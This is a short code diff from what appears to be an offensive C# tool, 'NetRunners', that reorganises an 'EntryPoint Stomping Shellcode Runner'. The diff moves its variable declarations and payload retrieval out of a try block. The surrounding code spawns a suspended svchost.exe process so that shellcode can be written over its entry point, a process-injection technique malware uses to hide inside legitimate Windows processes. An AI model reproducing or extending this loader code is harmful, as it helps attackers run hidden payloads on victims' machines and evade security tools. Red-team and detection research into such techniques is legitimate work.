@@ -16,24 +16,27 @@ namespace NetRunners.Runners
     {
         public void Run()
         {
+            IntPtr addressOfEntryPoint;
+            IntPtr hProcess;
+            IntPtr nRead;
+            IntPtr ptrToImageBase;
+            IntPtr svchostBase;
+            byte[] addrBuf;
+            byte[] data;
+            int result;
+            uint e_lfanew_offset;
+            uint entrypoint_rva;
+            uint opthdr;
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+            byte[] buf = GetPayload();
+            int sBuf = GetSize();
+            
             try
             {
-                IntPtr addressOfEntryPoint;
-                IntPtr hProcess;
-                IntPtr nRead;
-                IntPtr ptrToImageBase;
-                IntPtr svchostBase;
-                byte[] addrBuf;
-                byte[] data;
-                int result;
-                uint e_lfanew_offset;
-                uint entrypoint_rva;
-                uint opthdr;
-                STARTUPINFO si = new STARTUPINFO();
-                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
-                byte[] buf = GetPayload();
-                int sBuf = GetSize();
+                // here we are
+                Console.WriteLine("[+] EntryPoint Stomping Shellcode Runner selected!");
 
                 // create suspended svchost process
                 result = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
